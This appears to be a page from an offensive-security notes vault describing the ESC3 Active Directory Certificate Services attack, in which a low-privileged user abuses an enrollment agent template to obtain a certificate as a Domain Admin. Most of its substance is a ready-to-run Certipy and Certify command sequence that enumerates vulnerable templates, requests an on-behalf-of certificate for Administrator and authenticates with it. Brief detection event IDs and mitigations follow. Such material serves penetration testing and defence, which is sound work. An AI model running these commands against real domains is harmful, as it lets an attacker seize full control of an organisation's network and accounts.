---
title: "Attack #29 — ESC3 Certificate Request Agent"
description: "ESC3 exploits the Certificate Request Agent (Enrollment Agent) EKU. A template with this EKU allows the enrolled user to request certificates on behalf of…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Certipy", "Certify", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #29 — ESC3 Certificate Request Agent.md"
---
# 🟢 Attack #29 — ESC3: Certificate Request Agent

***

## 📖 How It Works

ESC3 exploits the **Certificate Request Agent** (Enrollment Agent) EKU. A template with this EKU allows the enrolled user to **request certificates on behalf of other users**. If a low-privileged user can enroll for an Enrollment Agent certificate, they can then use it to request a Client Authentication certificate for any user in the domain — including Domain Admins.

### Two-Step Attack

```
1. Enroll for a certificate with "Certificate Request Agent" EKU (Template A)
2. Use that certificate to request a Client Auth cert on behalf of Administrator (Template B)
3. Authenticate as Administrator using the resulting certificate
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Template with Certificate Request Agent EKU** | Low-priv users can enroll |
| **Second template allowing enrollment-on-behalf-of** | Must allow agent-based enrollment |
| **Manager approval not required** | On both templates |

***

## 💻 Full Commands

```bash
# ── Enumerate ─────────────────────────────────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# Look for: ESC3 — Certificate Request Agent template

# ── Step 1: Get enrollment agent certificate ─────────────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template EnrollmentAgentTemplate -dc-ip 10.10.10.10

# ── Step 2: Request cert on behalf of Administrator ──────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -ca CORP-CA \
  -template User -on-behalf-of 'corp\Administrator' \
  -pfx low_user.pfx -dc-ip 10.10.10.10

# ── Step 3: Authenticate ──────────────────────────────────────────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

```powershell
# ── Certify ───────────────────────────────────────────────────────────────────
.\Certify.exe request /ca:CORP-CA /template:EnrollmentAgentTemplate
# Convert to PFX, then use for on-behalf-of requests
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate enrollment — watch for enrollment agent requests |
| **4887** | Security Log (CA) | On-behalf-of requests from non-admin enrollment agents |

***

## 🔗 Attack Chain Context

```
[ESC3] ──→ Enrollment Agent → request certs as any user
         │
         ├──→ 🔗 Similar to ESC2 but with explicit Enrollment Agent EKU
         └──→ 💀 Defeated by: restrict enrollment agent templates, require approval
```

***

> ✅ **Attack #29 — ESC3 complete.**
